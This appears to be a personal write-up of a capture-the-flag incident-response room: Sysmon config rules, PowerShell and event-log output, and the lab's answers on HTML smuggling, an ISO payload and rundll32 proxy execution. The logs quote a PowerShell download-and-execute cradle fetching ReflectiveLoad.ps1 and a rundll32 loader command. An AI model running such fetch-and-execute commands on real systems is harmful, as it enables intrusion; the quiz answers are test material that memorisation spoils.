			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc</CommandLine> <!--Windows:Apps: AppX Deployment Service-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k wsappx -s ClipSVC</CommandLine> <!--Windows:Apps: Client License Service-->
			<CommandLine condition="is">C:\Windows\system32\svchost.exe -k wsappx</CommandLine> <!--Windows:Apps [ https://www.howtogeek.com/320261/what-is-wsappx-and-why-is-it-running-on-my-pc/ ] -->
			<ParentCommandLine condition="is">C:\Windows\system32\svchost.exe -k netsvcs</ParentCommandLine> <!--Windows: Network services: Spawns Consent.exe-->
			<ParentCommandLine condition="is">C:\Windows\system32\svchost.exe -k localSystemNetworkRestricted</ParentCommandLine> <!--Windows-->
			<CommandLine condition="is">C:\Windows\system32\deviceenroller.exe /c /AutoEnrollMDM</CommandLine> <!--Windows: AzureAD device enrollment agent-->
			<!--SECTION: Microsoft:Edge-->
			<CommandLine condition="begin with">"C:\Program Files (x86)\Microsoft\Edge Dev\Application\msedge.exe" --type=</CommandLine>
			<!--SECTION: Microsoft:dotNet-->
			<CommandLine condition="begin with">C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe</CommandLine> <!--Microsoft:DotNet-->
			<CommandLine condition="begin with">C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\Ngen.exe</CommandLine> <!--Microsoft:DotNet-->
			<CommandLine condition="begin with">C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe</CommandLine> <!--Microsoft:DotNet-->
			<CommandLine condition="begin with">C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe</CommandLine> <!--Microsoft:DotNet-->
			<Image condition="is">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe</Image> <!--Microsoft:DotNet-->
			<Image condition="is">C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe</Image> <!--Microsoft:DotNet-->
			<Image condition="is">C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe</Image> <!--Windows: Font cache service-->
			<ParentCommandLine condition="begin with">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe</ParentCommandLine>
			<ParentImage condition="is">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe</ParentImage> <!--Microsoft:DotNet-->
			<ParentImage condition="is">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe</ParentImage> <!--Microsoft:DotNet-->
			<ParentImage condition="is">C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe</ParentImage> <!--Microsoft:DotNet-->
			<ParentImage condition="is">C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngentask.exe</ParentImage> <!--Microsoft:DotNet: Spawns thousands of ngen.exe processes-->
			<!--SECTION: Microsoft:Office-->
			<Image condition="is">C:\Program Files\Microsoft Office\Office16\MSOSYNC.EXE</Image> <!--Microsoft:Office: Background process for SharePoint/Office365 connectivity-->
			<Image condition="is">C:\Program Files (x86)\Microsoft Office\Office16\MSOSYNC.EXE</Image> <!--Microsoft:Office: Background process for SharePoint/Office365 connectivity-->
			<Image condition="is">C:\Program Files\Common Files\Microsoft Shared\OfficeSoftwareProtectionPlatform\OSPPSVC.EXE</Image> <!--Microsoft:Office: Licensing service-->
			<Image condition="is">C:\Program Files\Microsoft Office\Office16\msoia.exe</Image> <!--Microsoft:Office: Telemetry collector-->
			<Image condition="is">C:\Program Files (x86)\Microsoft Office\root\Office16\officebackgroundtaskhandler.exe</Image>
			<!--SECTION: Microsoft:Office:Click2Run-->
			<Image condition="is">C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe</Image> <!--Microsoft:Office: Background process-->
			<ParentImage condition="is">C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe</ParentImage> <!--Microsoft:Office: Background process-->
			<ParentImage condition="is">C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe</ParentImage> <!--Microsoft:Office: Background process-->
			<!--SECTION: Windows: Media player-->
			<Image condition="is">C:\Program Files\Windows Media Player\wmpnscfg.exe</Image> <!--Windows: Windows Media Player Network Sharing Service Configuration Application-->
			<!--SECTION: Google-->
			<CommandLine condition="begin with">"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --type=</CommandLine> <!--Google:Chrome: massive command-line arguments-->
			<CommandLine condition="begin with">"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=</CommandLine> <!--Google:Chrome: massive command-line arguments-->
	</ProcessCreate>
    <!-- Log network connection if the destination port equal 443 -->
    <!-- or 80, and process isn't InternetExplorer -->
    <NetworkConnect onmatch="include">
      <DestinationPort>443</DestinationPort>
      <DestinationPort>80</DestinationPort>
    </NetworkConnect>
    <NetworkConnect onmatch="exclude">
      <Image condition="end with">iexplore.exe</Image>
    </NetworkConnect>
	<FileCreate onmatch="exclude">
		<!--SECTION: Microsoft-->
			<Image condition="is">C:\Program Files (x86)\EMET 5.5\EMET_Service.exe</Image> <!--Microsoft:EMET: Writes to C:\Windows\AppPatch\-->
			<!--SECTION: Microsoft:Office:Click2Run-->
			<Image condition="is">C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe</Image> <!-- Microsoft:Office Click2Run-->
			<!--SECTION: Windows-->
			<Image condition="is">C:\Windows\system32\smss.exe</Image> <!-- Windows: Session Manager SubSystem: Creates swapfile.sys,pagefile.sys,hiberfile.sys-->
			<Image condition="is">C:\Windows\system32\CompatTelRunner.exe</Image> <!-- Windows: Windows 10 app, creates tons of cache files-->
			<Image condition="is">\\?\C:\Windows\system32\wbem\WMIADAP.EXE</Image> <!-- Windows: WMI Performance updates-->
			<Image condition="is">C:\Windows\system32\mobsync.exe</Image> <!--Windows: Network file syncing-->
			<TargetFilename condition="begin with">C:\Windows\system32\DriverStore\Temp\</TargetFilename> <!-- Windows: Temp files by DrvInst.exe-->
			<TargetFilename condition="begin with">C:\Windows\system32\wbem\Performance\</TargetFilename> <!-- Windows: Created in wbem by WMIADAP.exe-->
			<TargetFilename condition="begin with">C:\Windows\Installer\</TargetFilename> <!--Windows:Installer: Ignore MSI installer files caching-->
			<!--SECTION: Windows:Updates-->
			<TargetFilename condition="begin with">C:\$WINDOWS.~BT\Sources\</TargetFilename> <!-- Windows: Feature updates containing lots of .exe and .sys-->
			<Image condition="begin with">C:\Windows\winsxs\amd64_microsoft-windows</Image> <!-- Windows: Windows update-->
			<Image condition="is">C:\WINDOWS\system32\svchost.exe</Image> <!--files created by svchost-->
	</FileCreate>
  </EventFiltering>
</Sysmon>


PS C:\Users\Maveris> Get-ItemProperty -Path "C:\Windows\System32\rundll32.exe" | Select-Object -Property *


PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Windows\System32\rundll32.exe
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Windows\System32
PSChildName       : rundll32.exe
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
Mode              : -a----
VersionInfo       : File:             C:\Windows\System32\rundll32.exe
                    InternalName:     rundll
                    OriginalFilename: RUNDLL32.EXE.MUI
                    FileVersion:      10.0.19041.1 (WinBuild.160101.0800)
                    FileDescription:  Windows host process (Rundll32)
                    Product:          Microsoft® Windows® Operating System
                    ProductVersion:   10.0.19041.1
                    Debug:            False
                    Patched:          False
                    PreRelease:       False
                    PrivateBuild:     False
                    SpecialBuild:     False
                    Language:         English (United States)

BaseName          : rundll32
Target            : {C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.19041.746_none_b
                    5fe9c5c09b9d7a9\rundll32.exe}
LinkType          : HardLink
Name              : rundll32.exe
Length            : 71680
DirectoryName     : C:\Windows\System32
Directory         : C:\Windows\System32
IsReadOnly        : False
Exists            : True
FullName          : C:\Windows\System32\rundll32.exe
Extension         : .exe
CreationTime      : 9/7/2022 8:07:15 PM
CreationTimeUtc   : 9/8/2022 3:07:15 AM
LastAccessTime    : 2/23/2023 12:05:43 PM
LastAccessTimeUtc : 2/23/2023 8:05:43 PM
LastWriteTime     : 9/7/2022 8:07:15 PM
LastWriteTimeUtc  : 9/8/2022 3:07:15 AM
Attributes        : Archive

My-Contacts.iso

PS C:\Windows\system32> Get-EventLog -LogName Security -InstanceId 4688 | Where-Object { $_.Message -match "rundll32.exe" -or $_.Message -match "My-Contacts.iso" }
PS C:\Windows\system32>

find iso

 EventData 

  RuleName - 
  UtcTime 2023-02-22 02:32:20.377 
  ProcessGuid {c10a41fe-7e59-63f5-f601-000000000700} 
  ProcessId 4344 
  Image C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.2300_none_7e14edbc7c88b7d5\TiWorker.exe 
  TargetFilename C:\Windows\CbsTemp\31016549_2909085884\Windows10.0-KB5022834-x64.cab\amd64_microsoft.windows.isolationautomation_6595b64144ccf1df_1.0.19041.746_none_7b8e643649cc7ccc 
  CreationUtcTime 2023-02-22 02:32:20.377 
  User NT AUTHORITY\SYSTEM 


https://redcanary.com/threat-detection-report/techniques/rundll32/

Event Viewer Windows Powershell (ID 800)

 powershell (New-Object System.Net.WebClient).DownloadString('https://github.com/P4BNS/THM/raw/main/ReflectiveLoad.ps1') | IEX 
   DetailSequence=1 DetailTotal=1 SequenceNumber=19 UserId=DESKTOP-9DF6QBQ\Maveris HostName=Default Host HostVersion=5.1.19041.1682 HostId=3289d488-8c54-427e-83f4-954cfce4b394 HostApplication=C:\Windows\System32\rundll32.exe Test-Loader.dll Runner EngineVersion=5.1.19041.1682 RunspaceId=17138aca-9f68-4fad-aa3c-a8e0391cd1d1 PipelineId=1 ScriptName= CommandLine=powershell (New-Object System.Net.WebClient).DownloadString 


Registry 
   Started 
   ProviderName=Registry NewProviderState=Started SequenceNumber=1 HostName=ConsoleHost HostVersion=5.1.19041.1682 HostId=9df4c43d-85b8-4748-86d4-1da4fb99b531 HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c Invoke-WebRequest -Uri https://raw.githubusercontent.com/P4BNS/THM/main/youve-been-hacked.jpeg -OutFile C:\Users\Maveris\AppData\Local\Temp\test.jpg EngineVersion= RunspaceId= PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine= 

I see need to download it

C:\Windows\System32\rundll32.exe Test-Loader.dll Runner
1234567891234567890

but not works

let's see again event viewer

the right answer is Windows\System32\rundll32.exe Test-Loader.dll Runner 

it took me more than half an hour
```


What type of file was the malware smuggled in?

The file suffix attached to the email will tell you!

*html*

What MITRE ATT&CK Technique is this an example of? (Use Sub-Technique name if applicable)

*html smuggling*

What type of file was downloaded to the system?

*.iso*

What is the name of the windows executable leveraged to execute malicious code on the system?

Please research the MITRE ATT&CK technique "Signed Binary Proxy Execution" before attempting answer.

[System Binary Proxy Execution, Technique T1218 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1218/)  

*rundll32*

Please provide the complete command line run by the shortcut file.   

Use logs or file properties to find the answer

	*Windows\System32\rundll32.exe Test-Loader.dll Runner*

This malware initiated a network connection to download additional malicious code, what was the URL with URI of the first file downloaded?

*https://github.com/P4BNS/THM/raw/main/ReflectiveLoad.ps1*


[[Tokyo Ghoul]]